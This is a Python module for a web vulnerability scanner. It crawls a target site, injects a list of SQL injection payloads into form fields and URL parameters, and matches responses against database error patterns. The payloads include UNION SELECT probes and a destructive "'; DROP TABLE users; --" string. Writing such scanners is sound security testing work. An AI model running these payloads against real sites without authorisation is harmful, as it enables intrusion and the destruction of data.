#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
SQL Injection (SQLi) Scanner Module.
This module implements scanning functionality to detect SQL Injection vulnerabilities.
"""

import re
import logging
import time
from typing import Dict, List, Any, Optional, Tuple, Set
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from bs4 import BeautifulSoup

from .base_scanner import BaseScanner

# Configure logging
logger = logging.getLogger('sqli_scanner')

class SQLiScanner(BaseScanner):
    """
    SQL Injection vulnerability scanner.
    Detects potential SQL Injection vulnerabilities in web applications.
    """
    
    def __init__(self, url: str, **kwargs):
        """
        Initialize SQLi scanner with specific SQLi testing parameters.
        
        Args:
            url (str): The target URL to scan
            **kwargs: Additional arguments to pass to the base scanner
        """
        super().__init__(url, **kwargs)
        
        # SQL Injection payloads
        self.sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "' OR '1'='1' #",
            "\" OR \"1\"=\"1",
            "\" OR \"1\"=\"1\" --",
            "\" OR \"1\"=\"1\" /*",
            "\" OR \"1\"=\"1\" #",
            "OR 1=1",
            "OR 1=1--",
            "OR 1=1/*",
            "OR 1=1#",
            "' OR 'x'='x",
            "' OR 'a'='a",
            "' OR 1=1--",
            "'; DROP TABLE users; --",
            "1' OR '1' = '1'",
            "' UNION SELECT 1,2,3 --",
            "' UNION SELECT 1,2,3,4 --",
            "' UNION SELECT 1,2,3,4,5 --",
            "1' ORDER BY 10--",
            "1' ORDER BY 1--",
            "1' GROUP BY 1,2,--",
            "1' GROUP BY 1,2,3--",
            "' HAVING 1=1 --",
            "' HAVING 'x'='x",
            "' AND 1=1 --",
            "' AND 1=0 --",
            "' OR 'x'='y",
        ]
        
        # SQL error patterns to detect in responses
        self.sql_error_patterns = [
            r"SQL syntax.*?MySQL",
            r"Warning.*?mysqli?",
            r"Warning.*?SQLite3",
            r"Warning.*?\Wmysqli?_",
            r"PostgreSQL.*?ERROR",
            r"Driver.*? SQL[\-\_\ ]*Server",
            r"ORA-[0-9][0-9][0-9][0-9]",
            r"Microsoft Access Driver",
            r"ODBC.*?Driver",
            r"Oracle error",
            r"DB2 SQL error",
            r"Sybase message",
            r"Unclosed quotation mark after the character string",
            r"mysql_fetch_array\(",
            r"Syntax error or access violation",
            r"mysqli?_\w+\(",
            r"pg_\w+\(",
            r"mssql_\w+\(",
            r"JDBC Driver",
            r"quotemeta",
            r"SQL syntax",
            r"Incorrect syntax near",
            r"Microsoft SQL Native Client error",
            r"You have an error in your SQL syntax",
            r"Unclosed quotation mark",
            r"SQL Server.*?Error",
            r"ORA-\d+",
            r"Microsoft OLE DB Provider for SQL Server",
            r"SQLSTATE",
            r"unexpected.*?near",
        ]
        
        # Compile regex patterns for better performance
        self.sql_error_regexes = [re.compile(pattern, re.IGNORECASE) for pattern in self.sql_error_patterns]
        
        # Initialize found URLs that contain forms or parameters
        self.form_urls = set()
        self.param_urls = set()
        
        # Track already tested URLs to avoid duplicates
        self.tested_urls = set()
    
    def _extract_forms(self, url: str) -> List[Dict[str, Any]]:
        """
        Extract forms from a webpage.
        
        Args:
            url (str): URL to extract forms from
            
        Returns:
            list: List of forms with their details
        """
        response = self.make_request(url)
        if not response:
            return []
        
        forms = []
        soup = BeautifulSoup(response.text, 'html.parser')
        
        for form in soup.find_all('form'):
            form_details = {}
            form_details['action'] = form.get('action', '')
            form_details['method'] = form.get('method', 'get').lower()
            
            # Extract input fields
            inputs = []
            for input_tag in form.find_all('input'):
                input_type = input_tag.get('type', 'text')
                input_name = input_tag.get('name')
                input_value = input_tag.get('value', '')
                
                if input_name:  # Skip inputs without name
                    inputs.append({
                        'type': input_type,
                        'name': input_name,
                        'value': input_value
                    })
            
            form_details['inputs'] = inputs
            forms.append(form_details)
            
            # Add form URL to the list of found form URLs
            if form_details['action']:
                form_url = urljoin(url, form_details['action'])
                self.form_urls.add(form_url)
        
        return forms
    
    def _extract_parameters(self, url: str) -> Dict[str, str]:
        """
        Extract URL parameters from a given URL.
        
        Args:
            url (str): URL to extract parameters from
            
        Returns:
            dict: Dictionary of parameter names and values
        """
        parsed_url = urlparse(url)
        return {k: v[0] for k, v in parse_qs(parsed_url.query).items()}
    
    def _is_vulnerable_to_sqli(self, response: str) -> bool:
        """
        Check if a response contains SQL error messages.
        
        Args:
            response (str): Response text to check
            
        Returns:
            bool: True if SQL error detected, False otherwise
        """
        for pattern in self.sql_error_regexes:
            if pattern.search(response):
                return True
        return False
    
    def _test_form(self, url: str, form: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """
        Test a form for SQL injection vulnerabilities.
        
        Args:
            url (str): URL of the page containing the form
            form (dict): Form details
            
        Returns:
            dict or None: Vulnerability details if found, None otherwise
        """
        form_action = urljoin(url, form['action']) if form['action'] else url
        
        # Skip if we've already tested this form action URL
        if form_action in self.tested_urls:
            return None
        
        self.tested_urls.add(form_action)
        
        # Track the most successful payload and the error it produced
        successful_test = None
        
        for payload in self.sql_payloads:
            # Skip testing if we already found a vulnerability in this form
            if successful_test:
                break
                
            # Log the testing progress if verbose
            if self.verbose:
                logger.debug(f"Testing form at {form_action} with payload: {payload}")
            
            # Prepare form data with the SQL payload
            data = {}
            
            # Find the most likely fields to inject into (text inputs, search fields, etc.)
            injectable_inputs = [
                input_field for input_field in form['inputs']
                if input_field['type'] in ['text', 'search', 'password', 'hidden']
            ]
            
            # If no injectable inputs found, try all inputs
            if not injectable_inputs:
                injectable_inputs = form['inputs']
            
            # Skip if no inputs to test
            if not injectable_inputs:
                continue
            
            # Add all form inputs to the data
            for input_field in form['inputs']:
                if input_field['type'] != 'submit':
                    if input_field in injectable_inputs:
                        # Inject the payload
                        data[input_field['name']] = payload
                    else:
                        # Keep original value for non-injectable fields
                        data[input_field['name']] = input_field['value']
            
            # Make the request according to the form method
            if form['method'] == 'post':
                response = self.make_request(form_action, method='POST', data=data)
            else:
                response = self.make_request(form_action, method='GET', params=data)
            
            # Check if the response was successful and contains SQL errors
            if response and self._is_vulnerable_to_sqli(response.text):
                # Found a vulnerability
                vulnerable_input = next((i['name'] for i in injectable_inputs), 'unknown_field')
                successful_test = {
                    'url': form_action,
                    'method': form['method'].upper(),
                    'payload': payload,
                    'field': vulnerable_input,
                    'details': f"Injected '{payload}' into field '{vulnerable_input}' using {form['method'].upper()}"
                }
        
        # If we found a vulnerability, return it
        if successful_test:
            return successful_test
        
        return None
    
    def _test_url_parameters(self, url: str) -> Optional[Dict[str, Any]]:
        """
        Test URL parameters for SQL injection vulnerabilities.
        
        Args:
            url (str): URL with parameters to test
            
        Returns:
            dict or None: Vulnerability details if found, None otherwise
        """
        # Skip if we've already tested this URL
        if url in self.tested_urls:
            return None
        
        self.tested_urls.add(url)
        
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        
        # Skip if no parameters
        if not params:
            return None
        
        # Add URL to the list of found parameter URLs
        self.param_urls.add(url)
        
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        
        # Track the most successful payload and the error it produced
        successful_test = None
        
        for param_name in params.keys():
            # Skip testing if we already found a vulnerability for this URL
            if successful_test:
                break
                
            orig_value = params[param_name][0]
            
            for payload in self.sql_payloads:
                # Log the testing progress if verbose
                if self.verbose:
                    logger.debug(f"Testing parameter '{param_name}' at {url} with payload: {payload}")
                
                # Create modified parameters with the payload
                modified_params = params.copy()
                modified_params[param_name] = [payload]
                
                # Encode the parameters
                query_string = urlencode(modified_params, doseq=True)
                
                # Build the full URL with the payload
                test_url = f"{base_url}?{query_string}"
                
                # Make the request
                response = self.make_request(test_url, method='GET')
                
                # Check if the response contains SQL errors
                if response and self._is_vulnerable_to_sqli(response.text):
                    # Found a vulnerability
                    successful_test = {
                        'url': url,
                        'method': 'GET',
                        'payload': payload,
                        'parameter': param_name,
                        'details': f"Injected '{payload}' into parameter '{param_name}'"
                    }
                    break
        
        # If we found a vulnerability, return it
        if successful_test:
            return successful_test
        
        return None
    
    def _crawl_and_identify_targets(self) -> Tuple[Set[str], Set[str]]:
        """
        Perform basic crawling to identify forms and URL parameters.
        
        Returns:
            tuple: Sets of form URLs and parameter URLs
        """
        logger.info("Crawling to identify forms and URL parameters...")
        
        # Start with the target URL
        to_visit = {self.target_url}
        visited = set()
        
        # Limit the crawling depth and number of URLs
        max_urls = 20
        
        while to_visit and len(visited) < max_urls:
            current_url = to_visit.pop()
            
            if current_url in visited:
                continue
                
            visited.add(current_url)
            
            # Check if URL has parameters
            parsed_url = urlparse(current_url)
            if parsed_url.query:
                self.param_urls.add(current_url)
            
            # Get the page and extract forms
            response = self.make_request(current_url)
            if not response:
                continue
                
            # Parse the HTML content
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extract forms
            forms = self._extract_forms(current_url)
            if forms:
                logger.debug(f"Found {len(forms)} forms on {current_url}")
            
            # Extract links for further crawling
            for a_tag in soup.find_all('a', href=True):
                href = a_tag['href']
                
                # Skip empty links, anchors, and external links
                if not href or href.startswith('#') or href.startswith('javascript:'):
                    continue
                    
                # Convert relative URL to absolute
                link = urljoin(current_url, href)
                
                # Ensure we stay within the same domain
                if urlparse(link).netloc == urlparse(self.target_url).netloc:
                    to_visit.add(link)
        
        logger.info(f"Crawling complete. Found {len(self.form_urls)} forms and {len(self.param_urls)} URLs with parameters")
        return self.form_urls, self.param_urls
    
    def scan(self) -> List[Dict[str, Any]]:
        """
        Scan for SQL Injection vulnerabilities.
        
        Returns:
            list: List of detected vulnerabilities
        """
        logger.info(f"Starting SQL Injection scan on {self.target_url}")
        start_time = time.time()
        
        # Crawl to identify forms and URL parameters
        form_urls, param_urls = self._crawl_and_identify_targets()
        
        # Test forms for SQL injection
        for form_url in form_urls:
            forms = self._extract_forms(form_url)
            
            for form in forms:
                vulnerability = self._test_form(form_url, form)
                
                if vulnerability:
                    # Add the vulnerability to our list
                    self.add_vulnerability(
                        vuln_type='SQL Injection',
                        url=vulnerability['url'],
                        title='SQL Injection in Form',
                        severity='high',
                        description='SQL Injection vulnerability found in a form input.',
                        details=vulnerability['details'],
                        recommendation='Implement prepared statements, parameterized queries, or ORM libraries. Validate and sanitize all user inputs.'
                    )
        
        # Test URL parameters for SQL injection
        for param_url in param_urls:
            vulnerability = self._test_url_parameters(param_url)
            
            if vulnerability:
                # Add the vulnerability to our list
                self.add_vulnerability(
                    vuln_type='SQL Injection',
                    url=vulnerability['url'],
                    title='SQL Injection in URL Parameter',
                    severity='high',
                    description='SQL Injection vulnerability found in URL parameter.',
                    details=vulnerability['details'],
                    recommendation='Implement prepared statements, parameterized queries, or ORM libraries. Validate and sanitize all user inputs.'
                )
        
        scan_duration = time.time() - start_time
        logger.info(f"SQL Injection scan completed in {scan_duration:.2f} seconds")
        logger.info(f"Found {len(self.vulnerabilities)} SQL Injection vulnerabilities")
        
        return self.vulnerabilities 